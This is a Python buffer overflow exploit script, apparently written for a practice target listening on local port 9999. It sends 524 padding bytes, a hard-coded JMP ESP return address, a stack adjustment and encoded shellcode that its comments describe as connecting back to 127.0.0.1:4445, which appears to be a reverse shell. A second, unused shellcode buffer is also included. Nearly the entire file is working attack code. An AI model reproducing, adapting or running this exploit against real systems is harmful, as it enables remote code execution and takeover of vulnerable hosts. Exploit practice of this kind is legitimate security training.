import socket
import sys
from time import sleep

ip="127.0.0.1"
port=9999
sub_esp ="\x83\xec\x10"

# -f py connect to  127.0.0.1:4445

buf =  b""
buf += b"\xdb\xce\xd9\x74\x24\xf4\x5a\xbd\xf2\x3d\x42\xd4\x2b"
buf += b"\xc9\xb1\x52\x31\x6a\x17\x83\xc2\x04\x03\x98\x2e\xa0"
buf += b"\x21\xa0\xb9\xa6\xca\x58\x3a\xc7\x43\xbd\x0b\xc7\x30"
buf += b"\xb6\x3c\xf7\x33\x9a\xb0\x7c\x11\x0e\x42\xf0\xbe\x21"
buf += b"\xe3\xbf\x98\x0c\xf4\xec\xd9\x0f\x76\xef\x0d\xef\x47"
buf += b"\x20\x40\xee\x80\x5d\xa9\xa2\x59\x29\x1c\x52\xed\x67"
buf += b"\x9d\xd9\xbd\x66\xa5\x3e\x75\x88\x84\x91\x0d\xd3\x06"
buf += b"\x10\xc1\x6f\x0f\x0a\x06\x55\xd9\xa1\xfc\x21\xd8\x63"
buf += b"\xcd\xca\x77\x4a\xe1\x38\x89\x8b\xc6\xa2\xfc\xe5\x34"
buf += b"\x5e\x07\x32\x46\x84\x82\xa0\xe0\x4f\x34\x0c\x10\x83"
buf += b"\xa3\xc7\x1e\x68\xa7\x8f\x02\x6f\x64\xa4\x3f\xe4\x8b"
buf += b"\x6a\xb6\xbe\xaf\xae\x92\x65\xd1\xf7\x7e\xcb\xee\xe7"
buf += b"\x20\xb4\x4a\x6c\xcc\xa1\xe6\x2f\x99\x06\xcb\xcf\x59"
buf += b"\x01\x5c\xbc\x6b\x8e\xf6\x2a\xc0\x47\xd1\xad\x27\x72"
buf += b"\xa5\x21\xd6\x7d\xd6\x68\x1d\x29\x86\x02\xb4\x52\x4d"
buf += b"\xd2\x39\x87\xc2\x82\x95\x78\xa3\x72\x56\x29\x4b\x98"
buf += b"\x59\x16\x6b\xa3\xb3\x3f\x06\x5e\x54\x3f\xd7\x60\xa5"
buf += b"\xd7\xd5\x60\xb4\x7a\x53\x86\xdc\x94\x35\x11\x49\x0c"
buf += b"\x1c\xe9\xe8\xd1\x8a\x94\x2b\x59\x39\x69\xe5\xaa\x34"
buf += b"\x79\x92\x5a\x03\x23\x35\x64\xb9\x4b\xd9\xf7\x26\x8b"
buf += b"\x94\xeb\xf0\xdc\xf1\xda\x08\x88\xef\x45\xa3\xae\xed"
buf += b"\x10\x8c\x6a\x2a\xe1\x13\x73\xbf\x5d\x30\x63\x79\x5d"
buf += b"\x7c\xd7\xd5\x08\x2a\x81\x93\xe2\x9c\x7b\x4a\x58\x77"
buf += b"\xeb\x0b\x92\x48\x6d\x14\xff\x3e\x91\xa5\x56\x07\xae"
buf += b"\x0a\x3f\x8f\xd7\x76\xdf\x70\x02\x33\xef\x3a\x0e\x12"
buf += b"\x78\xe3\xdb\x26\xe5\x14\x36\x64\x10\x97\xb2\x15\xe7"
buf += b"\x87\xb7\x10\xa3\x0f\x24\x69\xbc\xe5\x4a\xde\xbd\x2f"

# -f c connect to  127.0.0.1:4445  

payload2 = (
"\xb8\x0b\x1f\x27\x82\xdb\xc6\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
"\x52\x83\xeb\xfc\x31\x43\x0e\x03\x48\x11\xc5\x77\xb2\xc5\x8b"
"\x78\x4a\x16\xec\xf1\xaf\x27\x2c\x65\xa4\x18\x9c\xed\xe8\x94"
"\x57\xa3\x18\x2e\x15\x6c\x2f\x87\x90\x4a\x1e\x18\x88\xaf\x01"
"\x9a\xd3\xe3\xe1\xa3\x1b\xf6\xe0\xe4\x46\xfb\xb0\xbd\x0d\xae"
"\x24\xc9\x58\x73\xcf\x81\x4d\xf3\x2c\x51\x6f\xd2\xe3\xe9\x36"
"\xf4\x02\x3d\x43\xbd\x1c\x22\x6e\x77\x97\x90\x04\x86\x71\xe9"
"\xe5\x25\xbc\xc5\x17\x37\xf9\xe2\xc7\x42\xf3\x10\x75\x55\xc0"
"\x6b\xa1\xd0\xd2\xcc\x22\x42\x3e\xec\xe7\x15\xb5\xe2\x4c\x51"
"\x91\xe6\x53\xb6\xaa\x13\xdf\x39\x7c\x92\x9b\x1d\x58\xfe\x78"
"\x3f\xf9\x5a\x2e\x40\x19\x05\x8f\xe4\x52\xa8\xc4\x94\x39\xa5"
"\x29\x95\xc1\x35\x26\xae\xb2\x07\xe9\x04\x5c\x24\x62\x83\x9b"
"\x4b\x59\x73\x33\xb2\x62\x84\x1a\x71\x36\xd4\x34\x50\x37\xbf"
"\xc4\x5d\xe2\x10\x94\xf1\x5d\xd1\x44\xb2\x0d\xb9\x8e\x3d\x71"
"\xd9\xb1\x97\x1a\x70\x48\x70\x5a\x85\x52\x81\xcc\x87\x52\x90"
"\x51\x01\xb4\xf8\x79\x47\x6f\x95\xe0\xc2\xfb\x04\xec\xd8\x86"
"\x07\x66\xef\x77\xc9\x8f\x9a\x6b\xbe\x7f\xd1\xd1\x69\x7f\xcf"
"\x7d\xf5\x12\x94\x7d\x70\x0f\x03\x2a\xd5\xe1\x5a\xbe\xcb\x58"
"\xf5\xdc\x11\x3c\x3e\x64\xce\xfd\xc1\x65\x83\xba\xe5\x75\x5d"
"\x42\xa2\x21\x31\x15\x7c\x9f\xf7\xcf\xce\x49\xae\xbc\x98\x1d"
"\x37\x8f\x1a\x5b\x38\xda\xec\x83\x89\xb3\xa8\xbc\x26\x54\x3d"
"\xc5\x5a\xc4\xc2\x1c\xdf\xe4\x20\xb4\x2a\x8d\xfc\x5d\x97\xd0"
"\xfe\x88\xd4\xec\x7c\x38\xa5\x0a\x9c\x49\xa0\x57\x1a\xa2\xd8"
"\xc8\xcf\xc4\x4f\xe8\xc5")

pattern="A"*524+"\xf3\x12\x17\x31"+sub_esp+payload2
s = socket.socket()
s.connect((ip,port))
s.send(pattern)
sleep(3)


#JMP ESP address : 0x311712F3
#nasm_shell sub esp, 0x10 : 
